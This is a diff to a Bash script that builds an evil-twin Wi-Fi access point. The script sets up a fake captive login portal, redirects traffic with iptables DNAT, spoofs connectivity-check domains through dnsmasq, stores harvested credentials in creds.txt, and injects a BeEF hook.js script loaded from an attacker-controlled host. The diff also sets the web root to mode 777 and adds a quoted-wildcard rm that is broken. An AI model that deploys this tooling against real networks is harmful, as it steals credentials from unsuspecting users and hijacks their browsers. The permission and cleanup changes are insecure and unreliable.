@@ -24,10 +24,10 @@ ESSID_VAR="PI_WIFI_TEST"
 PASSWORD_CRACKED="A123456789a!"
 
 
-IP_PORTAL="192.168.1.1"
-HTTP="80"
-HTTPS="443"
-DNS="53"
+IP_PORTAL=192.168.1.1
+HTTP=80
+HTTPS=443
+DNS=53
 
 #Variables BEEF
 WANTS_BEEF="$1"
@@ -114,11 +114,11 @@ rules_iptables_ipforward(){
     sudo iptables -A FORWARD -i $SELECTED_INTERFACE -o $INTERFACE_OUTPUT -j REJECT
 
     #Peticiones HTTP/S van al portal de apache2
-    iptables -t nat -A PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $HTTP -j DNAT --to-destination "$IP_PORTAL:$HTTP"
-    iptables -t nat -A PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $HTTPS -j DNAT --to-destination "$IP_PORTAL:$HTTPS"
+    iptables -t nat -A PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $HTTP -j DNAT --to-destination $IP_PORTAL:$HTTP
+    iptables -t nat -A PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $HTTPS -j DNAT --to-destination $IP_PORTAL:$HTTPS
     #Todas las peticiones se van al dns local
-    iptables -t nat -A PREROUTING -i $SELECTED_INTERFACE -p udp --dport $DNS -j DNAT --to-destination "$IP_PORTAL:$DNS"
-    iptables -t nat -A PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $DNS -j DNAT --to-destination "$IP_PORTAL:$DNS"
+    iptables -t nat -A PREROUTING -i $SELECTED_INTERFACE -p udp --dport $DNS -j DNAT --to-destination $IP_PORTAL:$DNS
+    iptables -t nat -A PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $DNS -j DNAT --to-destination $IP_PORTAL:$DNS
 
 }
 
@@ -191,7 +191,7 @@ foreach (\$captive_checks as \$check) {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login Required - <?php echo htmlspecialchars(\$essid); ?></title>
     <link rel="stylesheet" href="style.css">
-    "$BEEF_HTML"
+    $BEEF_HTML
 </head>
 <body>
     <div class="portal">
@@ -308,10 +308,10 @@ bind-interfaces
 log-queries
 log-facility=/var/log/dnsmasq.log
 
-address=/connectivitycheck.gstatic.com/"$IP_PORTAL"
-address=/clients3.google.com/"$IP_PORTAL"
-address=/capcha.apple.com/"$IP_PORTAL"
-address=/msftconnecttest.com/"$IP_PORTAL"
+address=/connectivitycheck.gstatic.com/$IP_PORTAL
+address=/clients3.google.com/$IP_PORTAL
+address=/capcha.apple.com/$IP_PORTAL
+address=/msftconnecttest.com/$IP_PORTAL
 server=8.8.8.8
 EOF
 
@@ -414,7 +414,7 @@ move_files_created(){
     sudo touch /var/www/html/creds.txt
     check_success "touch /var/www/html/creds.txt"
 
-    sudo chmod -R 664 /var/www/html
+    sudo chmod -R 777 /var/www/html
     check_success "chmod 664 /var/www/html/*"
 
     sudo chown www-data:www-data /var/www/html/creds.txt
@@ -590,13 +590,14 @@ cleanup() {
     sudo ip link set $SELECTED_INTERFACE down
 
     sudo systemctl stop isc-dhcp-server
-    sudo systemctl stop beef-xss    
+    sudo systemctl stop dnsmasq
+    sudo systemctl stop beef-xss
+    sudo systemctl stop apache2    
 
     sudo iptables -F FORWARD
 
-    sudo rm "${DIRECTORY}${FILE_isc}"
-    sudo rm "${DIRECTORY}${FILE_dhcp}"
-    sudo rm "${DIRECTORY}${FILE_dns}"
+    sudo rm "${DIRECTORY}*"
+    
 }
 
 false_ap(){
@@ -607,7 +608,7 @@ false_ap(){
             echo "No se puede ejecutar el beef"
             exit 1
         else
-            BEEF_HTML="<script src="http://$IP_HOOK:3000/hook.js"></script>"
+            BEEF_HTML="<script src="https://$IP_HOOK:3000/hook.js"></script>"
         fi
     fi
     #Verificar si funciona y que si entramos con monitor lo pone en manager
@@ -619,7 +620,7 @@ false_ap(){
 
     create_all_files_portal
     move_files_created
-    
+    configure_apache2
    
     #Posem la interficie wireless en mode 
     sudo ip link set $SELECTED_INTERFACE down
@@ -640,9 +641,12 @@ false_ap(){
         exit 1
     fi
 
-    rules_iptables_ipforward
-    sudo hostapd "${DIRECTORY}${FILE_hostapd}" -B #for broadcast
+    if ! activate_apache2; then 
+        exit 1
+    fi
 
+    rules_iptables_ipforward
+    sudo hostapd "${DIRECTORY}${FILE_hostapd}" # -Bfor broadcast
 }
 
 
